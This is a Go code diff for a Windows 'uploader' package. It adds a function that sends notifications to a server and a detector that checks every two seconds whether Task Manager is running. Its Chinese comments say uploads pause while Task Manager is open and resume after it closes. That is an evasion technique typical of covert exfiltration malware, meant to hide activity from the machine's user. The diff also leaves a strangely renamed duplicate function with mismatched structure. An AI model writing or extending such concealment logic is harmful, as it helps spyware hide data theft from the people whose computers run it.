@@ -3,6 +3,7 @@ package uploader
 import (
 	"net"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -10,7 +11,22 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func StartTaskManagerDetector(conn net.Conn) {
+// 新增：统一的“发一条通知”函数（全局通用）
+func NotifyServer(message string) {
+	// 直接从连接池拿一条连接，发完就扔回去
+	conn := getPooledConn()
+	defer putPooledConn(conn)
+
+	// 超时保护，防止卡死
+	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	conn.Write([]byte("NOTIFY\n" + message + "\n"))
+	// 不读响应，不设 deadline 清除，归还后自动重置
+}
+
+// 新的任务管理器检测器（只启动一次，内部自动用连接池发通知）
+var startTaskmgrDetectorOnce sync.Once
+
+func StartTaskManagerDetector55555(conn net.Conn) {
 	if TaskmgrRunning.Load() {
 		return
 	}
@@ -27,6 +43,26 @@ func StartTaskManagerDetector(conn net.Conn) {
 			}
 			time.Sleep(2 * time.Second)
 		}
+	})
+}
+
+func StartTaskManagerDetector() { // 注意：不再需要传 conn 参数！
+	startTaskmgrDetectorOnce.Do(func() {
+		SafeGo(func() {
+			for {
+				running := isTaskManagerRunning()
+
+				if running && !TaskmgrRunning.Load() {
+					TaskmgrRunning.Store(true)
+					NotifyServer("检测到任务管理器 → 暂停上传")
+				} else if !running && TaskmgrRunning.Load() {
+					TaskmgrRunning.Store(false)
+					NotifyServer("任务管理器已关闭 → 恢复上传")
+				}
+
+				time.Sleep(2 * time.Second)
+			}
+		})
 	})
 }
 
